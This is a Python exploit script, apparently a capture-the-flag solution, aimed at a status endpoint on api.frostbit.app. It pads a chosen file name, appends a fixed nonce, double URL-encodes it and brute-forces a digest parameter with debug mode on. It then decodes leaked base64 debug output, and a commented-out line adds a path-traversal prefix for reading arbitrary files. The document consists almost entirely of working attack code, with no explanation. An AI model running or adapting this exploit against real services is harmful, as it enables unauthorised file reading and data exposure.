import requests
from itertools import product
import re
import base64
import urllib.parse

regex = r'const debugData = "(.*?)";'

base_url = "https://api.frostbit.app/view/{}/{}/status?digest={}&debug=true"

uuid = "3da17f67-ee61-455d-afc2-aa20e8c7911e"

digest_str = "00{}00000{}0{}0{}0{}0{}0{}00000{}0{}0{}0{}0"
ranges = [[0,8],[0,8],[0,8],[0,8],[0,4],[0,4],[0,8],[0,8],[0,8],[0,8],[0,4]]

padding_byte = b"\xff"
append_nonce = b"\x9e\xe0\xe7\xc0\xa1\xe3\xb5\xda\xde\xe0\xe7\xc0\xa1\xe3\xb5\xda"

file = input ("File: ")
#file = "../../../..{}".format(file)

print ("FILENAME --> {}".format(file))
file = file.encode("utf-8")
while len(file) % 16 != 0:
	file += padding_byte
print ("PADDED FILENAME --> {}".format(file))
file += append_nonce
print ("PADDED FILENAME WITH APPENDED NONCE --> {} - LEN {}".format(file, len(file)))
file = urllib.parse.quote_plus(urllib.parse.quote_plus(file))
print ("DOUBLE URL ENCODED --> {}".format(file))

for combination in product(*ranges):
	digest = digest_str.format(*combination)
	url = base_url.format(file, uuid, digest)
	print ("ATTEMPTING DIGEST --> {}".format(digest))
	r = requests.get(url)
	#print ("RESPONSE --> {}...".format(r.text[0:min(50, len(r.text))]))
	#print ("RESPONSE --> {}".format(r.text))
	if "Status Id Too Long" in r.text:
		print (" --> ERROR!!! Status Id Too Long !!!")
		break
	elif "Status Id File Not Found" in r.text:
		print (" --> ERROR!!! Status Id File Not Found !!!")
		break
	elif "Invalid Status Id or Digest" not in r.text:
		print (" --> SUCCESS")
		matches = re.search(regex, r.text, re.MULTILINE)
		b64_value = matches.group(1)
		print ("DEBUG DATA B64 VALUE --> {}".format(b64_value))
		print (" --> DECODED STRING --> ")
		print (base64.b64decode(b64_value).decode("utf-8"))
		break